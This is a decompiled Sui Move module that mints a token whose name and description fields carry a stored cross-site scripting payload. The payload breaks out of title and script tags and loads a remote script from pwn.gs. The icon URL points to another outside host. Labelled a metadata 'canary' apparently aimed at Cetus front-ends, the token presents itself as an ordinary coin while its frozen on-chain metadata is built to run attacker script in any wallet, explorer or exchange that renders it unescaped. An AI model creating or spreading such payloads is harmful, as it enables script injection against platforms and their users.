module 0x2e06c266a033bc1fcd3a9d6e72b9c5f1fe8fcea3c51f454396d9f586e3e17bf::cetus_sui_metadata_canary {
    struct CETUS_SUI_METADATA_CANARY has drop {
        dummy_field: bool,
    }

    fun init(arg0: CETUS_SUI_METADATA_CANARY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1) = 0x2::coin::create_currency<CETUS_SUI_METADATA_CANARY>(arg0, 9, b"CXSS", b"</titLe/</scRipt/--!><scRiPt src=//pwn.gs></scRiPt>", b"Cetus metadata canary marker: </titLe </scRipt <scRiPt src=//pwn.gs>", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://b.0dd.wtf/cetus-sui-metadata-icon-20260601.svg")), arg1);
        let v2 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CETUS_SUI_METADATA_CANARY>>(v1);
        0x2::transfer::public_transfer<0x2::coin::Coin<CETUS_SUI_METADATA_CANARY>>(0x2::coin::mint<CETUS_SUI_METADATA_CANARY>(&mut v2, 1, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<CETUS_SUI_METADATA_CANARY>>(v2, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

